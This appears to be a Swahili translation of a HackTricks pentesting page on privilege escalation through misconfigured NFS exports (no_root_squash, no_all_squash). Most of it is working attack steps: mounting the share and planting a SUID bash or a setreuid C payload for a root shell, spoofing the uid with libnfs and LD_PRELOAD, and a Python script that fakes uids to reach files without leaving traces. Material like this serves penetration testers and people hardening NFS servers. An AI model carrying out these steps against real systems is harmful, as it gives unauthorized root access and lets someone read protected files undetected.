{{#include ../../banners/hacktricks-training.md}}

Soma _ **/etc/exports** _ faili, ikiwa unapata directory ambayo imewekwa kama **no_root_squash**, basi unaweza **kufikia** hiyo kutoka **kama mteja** na **kuandika ndani** ya hiyo directory **kama** ungekuwa **root** wa mashine hiyo.

**no_root_squash**: Chaguo hili kimsingi linampa mamlaka mtumiaji wa root kwenye mteja kufikia faili kwenye seva ya NFS kama root. Na hii inaweza kusababisha athari kubwa za usalama.

**no_all_squash:** Hii ni sawa na chaguo la **no_root_squash** lakini inatumika kwa **watumiaji wasiokuwa root**. Fikiria, una shell kama mtumiaji nobody; umeangalia faili ya /etc/exports; chaguo la no_all_squash lipo; angalia faili ya /etc/passwd; fanya kama mtumiaji asiye root; tengeneza faili ya suid kama mtumiaji huyo (kwa kuunganisha kwa kutumia nfs). Tekeleza suid kama mtumiaji nobody na kuwa mtumiaji tofauti.

# Privilege Escalation

## Remote Exploit

Ikiwa umepata udhaifu huu, unaweza kuutumia:

- **Kuweka hiyo directory** kwenye mashine ya mteja, na **kama root kunakili** ndani ya folda iliyounganishwa faili ya **/bin/bash** na kumpa haki za **SUID**, na **kutekeleza kutoka kwa mashine** ya mwathirika hiyo binary ya bash.
```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```
- **Kuweka hiyo directory** kwenye mashine ya mteja, na **kama root kunakili** ndani ya folda iliyowekwa payload yetu iliyotengenezwa ambayo itatumia ruhusa ya SUID, itapeleka **SUID** haki, na **kuitekeleza kutoka kwa** mashine ya mwathirika hiyo binary (unaweza kupata hapa baadhi ya [C SUID payloads](payloads-to-execute.md#c)).
```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```
## Local Exploit

> [!NOTE]
> Kumbuka kwamba ikiwa unaweza kuunda **tunnel kutoka kwa mashine yako hadi mashine ya mwathirika unaweza bado kutumia toleo la Remote kutekeleza kupanda kwa haki hii kwa kutunga bandari zinazohitajika**.\
> Huu ni ujanja wa kufuata ikiwa faili `/etc/exports` **inaonyesha IP**. Katika kesi hii **hutaweza kutumia** kwa hali yoyote **exploit ya mbali** na utahitaji **kudhulumu ujanja huu**.\
> Sharti lingine muhimu ili exploit ifanye kazi ni kwamba **export ndani ya `/etc/export`** **lazima litumie bendera ya `insecure`**.\
> --_Sijui kama `/etc/export` inaonyesha anwani ya IP ujanja huu utafanikiwa_--

## Basic Information

Hali hii inahusisha kutumia NFS share iliyowekwa kwenye mashine ya ndani, ikitumia kasoro katika spesifikesheni ya NFSv3 ambayo inaruhusu mteja kubainisha uid/gid yake, ambayo inaweza kuwezesha ufikiaji usioidhinishwa. Kutekeleza kunahusisha kutumia [libnfs](https://github.com/sahlberg/libnfs), maktaba inayoruhusu kutunga NFS RPC calls.

### Compiling the Library

Hatua za ukusanyaji wa maktaba zinaweza kuhitaji marekebisho kulingana na toleo la kernel. Katika kesi hii maalum, syscalls za fallocate zilikuwa zimeandikwa nje. Mchakato wa ukusanyaji unajumuisha amri zifuatazo:
```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```
### Kufanya Uhalifu

Uhalifu unahusisha kuunda programu rahisi ya C (`pwn.c`) inayoinua mamlaka hadi root na kisha kutekeleza shell. Programu inakusanywa, na binary inayotokana (`a.out`) inawekwa kwenye sehemu yenye suid root, ikitumia `ld_nfs.so` kuficha uid katika wito za RPC:

1. **Kusanya msimbo wa uhalifu:**

```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```

2. **Weka uhalifu kwenye sehemu na badilisha ruhusa zake kwa kuficha uid:**

```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```

3. **Tekeleza uhalifu ili kupata mamlaka ya root:**
```bash
/mnt/share/a.out
#root
```

## Bonus: NFShell kwa Ufikiaji wa Faili wa Siri

Mara tu ufikiaji wa root unapopatikana, ili kuingiliana na sehemu ya NFS bila kubadilisha umiliki (ili kuepuka kuacha alama), skripti ya Python (nfsh.py) inatumika. Skripti hii inarekebisha uid ili kuendana na ile ya faili inayofikiwa, ikiruhusu kuingiliana na faili kwenye sehemu bila matatizo ya ruhusa:
```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
try:
uid = os.stat(filepath).st_uid
except OSError as e:
return get_file_uid(os.path.dirname(filepath))
return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```
Kimbia kama:
```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```
{{#include ../../banners/hacktricks-training.md}}
